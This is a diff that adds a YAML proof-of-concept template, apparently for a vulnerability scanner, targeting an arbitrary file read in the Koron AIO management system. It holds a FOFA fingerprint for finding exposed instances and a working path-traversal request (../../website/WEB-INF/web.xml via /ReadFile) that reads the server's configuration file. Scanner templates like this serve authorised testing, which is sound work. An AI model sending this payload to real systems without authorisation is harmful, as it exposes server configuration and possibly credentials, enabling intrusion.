@@ -1,0 +1,15 @@
+id: poc-yaml-koron-aio-readfile-anyfile-read
+info:
+  name: 科荣 AIO管理系统 ReadFile 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 科荣 AIO 管理系统
+  fofa: body="changeAccount('8000')"
+requests:
+- method: GET
+  path: /ReadFile?tempFile=path&path=../../website/WEB-INF/&fileName=web.xml
+  expression: status_code == 200 && contains(body,"<web-app") && contains(body,"<filter>")
+    && contains(body,"java.sun.com")
+variables: {}
+transport: http
